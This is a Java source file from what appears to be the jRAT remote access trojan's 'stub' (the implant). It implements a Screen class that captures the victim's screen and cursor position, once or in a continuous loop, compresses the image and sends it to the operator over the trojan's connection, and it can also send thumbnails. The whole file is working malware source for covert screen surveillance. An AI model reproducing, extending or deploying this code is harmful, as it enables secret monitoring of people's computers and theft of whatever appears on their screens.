package pro.jrat.stub;

import java.awt.GraphicsDevice;
import java.awt.GraphicsEnvironment;
import java.awt.MouseInfo;
import java.awt.Point;
import java.awt.PointerInfo;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.io.FileOutputStream;


import pro.jrat.stub.packets.incoming.Packet12RemoteScreen;
import pro.jrat.stub.packets.incoming.Packet13OneRemoteScreen;
import pro.jrat.stub.packets.outgoing.AbstractOutgoingPacket;
import pro.jrat.stub.packets.outgoing.Packet17RemoteScreen;
import pro.jrat.stub.packets.outgoing.Packet18OneRemoteScreen;
import pro.jrat.stub.packets.outgoing.Packet33Thumbnail;
import pro.jrat.stub.utils.ImageUtils;

public class Screen implements Runnable {

	public static boolean running;

	private boolean repeat;
	private int size;
	private int quality;
	private int monitor;

	public Screen(boolean repeat, int size, int quality, int monitor) {
		this.repeat = repeat;
		this.size = size;
		this.quality = quality;
		this.monitor = monitor;
	}

	@Override
	public void run() {
		if (repeat) {
			running = true;
		}
		
		double scaledSize = size / 100D;

		try {
			do {
				BufferedImage image;
				Rectangle screenBounds;

				if (monitor == -1) {
					Robot robot = new Robot();
					screenBounds = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
					image = robot.createScreenCapture(screenBounds);
				} else {
					GraphicsDevice screen = GraphicsEnvironment.getLocalGraphicsEnvironment().getScreenDevices()[monitor];
					Robot robot = new Robot(screen);
					screenBounds = screen.getDefaultConfiguration().getBounds();
					screenBounds.x = 0;
					screenBounds.y = 0;
					image = robot.createScreenCapture(screenBounds);
				}

				if (scaledSize != 1.0D) {
					image = ImageUtils.resize(image, scaledSize);
				}

				PointerInfo a = MouseInfo.getPointerInfo();
				Point b = a.getLocation();
				int x = (int) b.getX();
				int y = (int) b.getY();
				
				int scaledWidth = (int) (x * scaledSize);
				int scaledHeight = (int) (y * scaledSize);
				
				AbstractOutgoingPacket packet;
				
				byte[] array = ImageUtils.encode(image, (float) quality / 10F);
				
				System.out.println(array.length);
				
				if (repeat) {
					packet = new Packet17RemoteScreen(array, scaledWidth, scaledHeight);
				} else {
					packet = new Packet18OneRemoteScreen(array, scaledWidth, scaledHeight);
				}
				
				packet.send(Connection.dos, Connection.sw);
			} while (running);
		} catch (Exception ex) {
			ex.printStackTrace();
		}
		
		running = false;
	}

	public static void sendThumbnail() {
		try {
			Connection.addToSendQueue(new Packet33Thumbnail());
		} catch (Exception ex) {
			ex.printStackTrace();
		}
	}

	public boolean isRepeat() {
		return repeat;
	}

	public void setRepeat(boolean repeat) {
		this.repeat = repeat;
	}

	public int getImageSize() {
		return size;
	}

	public void setImageSize(int size) {
		this.size = size;
	}

	public int getQuality() {
		return quality;
	}

	public void setQuality(int quality) {
		this.quality = quality;
	}

	public int getMonitor() {
		return monitor;
	}

	public void setMonitor(int monitor) {
		this.monitor = monitor;
	}

}
